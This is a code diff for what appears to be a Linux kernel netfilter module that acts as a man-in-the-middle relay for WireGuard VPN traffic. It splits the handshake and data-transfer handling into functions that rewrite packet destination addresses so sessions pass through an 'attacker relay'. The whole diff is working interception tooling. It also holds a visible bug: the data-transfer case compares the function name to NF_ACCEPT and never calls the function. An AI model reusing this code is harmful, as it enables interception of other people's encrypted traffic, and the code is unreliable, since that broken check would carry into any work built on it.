@@ -18,6 +18,7 @@ static struct ring_buffer * wg_l_buf;
 
 // figure out the hex for this
 char * EXT_IFACE = "192.168.122.60";
+uint32_t EXT_IP;
 
 // minimum size for Wireguard packet
 // double check this
@@ -188,7 +189,81 @@ uint32_t find_last(struct ring_buffer * list, uint32_t ip)
    return 0;
 }
 
-    
+unsigned int wgHandshakeReq(struct iphdr * iph, struct wghdr * wgh) 
+{
+   struct ring_buffer * list = wg_l_buf;
+   // if its trying to start a new session through 
+   //    the attacker relay
+   if(iph->daddr == EXT_IP) {
+      // guess it was the last peer it talked to?
+      uint32_t last = find_last(list, iph->saddr);
+      printk(KERN_INFO "Guessing last ip.\n");
+      if(last != 0) {
+         iph->daddr = last;
+      } else {
+         // drop, force it to try again
+         return NF_DROP;
+      }
+   }
+   // peer id == wgh->index1
+   add_peer(list, &(wgh->index1), &(iph->saddr));
+   printk("Accepted handshake initiation.\n");
+   return NF_ACCEPT;
+}
+
+
+unsigned int wgHandshakeRes(struct iphdr * iph, struct wghdr * wgh)
+{
+   struct peer_serv_pair * pair;
+   struct ring_buffer * list = wg_l_buf;
+   printk(KERN_INFO "WG handshake response.\n");
+   // peer id == wgh->index2
+   // serv id == wgh->index1
+   pair = add_serv(list, &(wgh->index2), &(wgh->index1), &(iph->saddr));
+   if(pair == NULL) {
+      // didn't record handshake initiation
+      //    drop packet and force re-handshake
+      printk(KERN_INFO "Peer not known.\n");
+      return NF_DROP;
+   }//endif
+   // change destination IP from attacker IP to 
+   //    peer IP
+   //    source address will change on postroute hook
+   iph->daddr = pair->peer.ip_addr;
+   printk(KERN_INFO "Sending response: %x to %x\n", iph->saddr, iph->daddr);
+   return NF_ACCEPT;
+}
+
+unsigned int wgDataXfer(struct iphdr * iph, struct wghdr * wgh)
+{
+   struct peer_serv_pair * pair;
+   struct ring_buffer * list = wg_l_buf;
+   // receiver id == wgh->index1
+   // may be peer or server
+   struct wg_tuple *src = NULL;
+   struct wg_tuple *dst = NULL;
+   printk(KERN_INFO "WG data transfer.\n");
+   // find in known associations of peers
+   int peer = find_pair(list, &(wgh->index1), &pair);
+   if(peer == 1) {
+      src = &(pair->peer);
+      dst = &(pair->serv);
+   } else if(peer == 0) {
+      src = &(pair->serv);
+      dst = &(pair->peer);
+   } else {
+      printk(KERN_INFO "Can't find session.\n");
+      return NF_DROP;
+   } //endifelse
+   iph->daddr = dst->ip_addr;
+   // update source address if roaming
+   if(src->ip_addr != iph->saddr) {
+      src->ip_addr = iph->saddr;
+   }//endif
+   return NF_ACCEPT;
+}
+
+
 unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_hook_state * state)
 {
    struct iphdr * iph;
@@ -203,6 +278,7 @@ unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_h
          struct wghdr wg_type_buf;
          struct wghdr * wgh;
          size_t wg_hdr_offset = (iph->ihl * 4) + sizeof(struct udphdr);
+         // this is a tricky function -- see docs
          wgh = skb_header_pointer(skb, wg_hdr_offset, sizeof(struct wghdr), &wg_type_buf);
          if(wgh == NULL) {
             return NF_ACCEPT;
@@ -217,73 +293,25 @@ unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_h
          // Host endianness is least significant byte first
          if((wgh->type <= 4) && (wgh->type > 0)) {
             //printk(KERN_INFO "Found WG packet.\n");
-            struct ring_buffer * list = wg_l_buf;
-            struct peer_serv_pair * pair;
-         
             switch(wgh->type) { 
                // WG handshake step 1
                case 1: 
-                  // if its trying to start a new session through 
-                  //    the attacker relay
-                  if(iph->daddr == in_aton(EXT_IFACE)) {
-                     // guess it was the last peer it talked to?
-                     uint32_t last = find_last(list, iph->saddr);
-                     printk(KERN_INFO "Guessing last ip.\n");
-                     if(last != 0) {
-                        iph->daddr = last;
-                     } else {
-                        // drop, force it to try again
-                        return NF_DROP;
-                     }
+                  if(wgHandshakeReq(iph, wgh) != NF_ACCEPT) {
+                     return NF_DROP;
                   }
-                  // peer id == wgh->index1
-                  add_peer(list, &(wgh->index1), &(iph->saddr));
-                  printk("Accepted handshake initiation.\n");
                   break;
                // WG handshake step 2
                case 2: 
-                  printk(KERN_INFO "WG handshake response.\n");
-                  // peer id == wgh->index2
-                  // serv id == wgh->index1
-                  pair = add_serv(list, &(wgh->index2), &(wgh->index1), &(iph->saddr));
-                  if(pair == NULL) {
-                     // didn't record handshake initiation
-                     //    drop packet and force re-handshake
-                     printk(KERN_INFO "Peer not known.\n");
+                  if(wgHandshakeRes(iph, wgh) != NF_ACCEPT) {
                      return NF_DROP;
-                  }//endif
-                  // change destination IP from attacker IP to 
-                  //    peer IP
-                  //    source address will change on postroute hook
-                  iph->daddr = pair->peer.ip_addr;
-                  printk(KERN_INFO "Sending response: %x to %x\n", iph->saddr, iph->daddr);
+                  }
                   break;
                // WG data transfer
-               case 4: {
-                  // receiver id == wgh->index1
-                  // may be peer or server
-                  struct wg_tuple *src = NULL;
-                  struct wg_tuple *dst = NULL;
-                  printk(KERN_INFO "WG data transfer.\n");
-                  // find in known associations of peers
-                  int peer = find_pair(list, &(wgh->index1), &pair);
-                  if(peer == 1) {
-                     src = &(pair->peer);
-                     dst = &(pair->serv);
-                  } else if(peer == 0) {
-                     src = &(pair->serv);
-                     dst = &(pair->peer);
-                  } else {
-                     printk(KERN_INFO "Can't find session.\n");
+               case 4: 
+                  if(wgDataXfer != NF_ACCEPT) {
                      return NF_DROP;
-                  } //endifelse
-                  iph->daddr = dst->ip_addr;
-                  // update source address if roaming
-                  if(src->ip_addr != iph->saddr) {
-                     src->ip_addr = iph->saddr;
-                  }//endif
+                  }
                   break;
-                       }
                default: 
                   // case 3, this is not wireguard
                   return NF_ACCEPT;
@@ -361,6 +389,8 @@ int register_filter(void)
    wg_mitm_hook2.pf = PF_INET;
    wg_mitm_hook2.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &wg_mitm_hook2);
+
+   EXT_IP = in_aton(EXT_IFACE);
 
    return 0;
 }
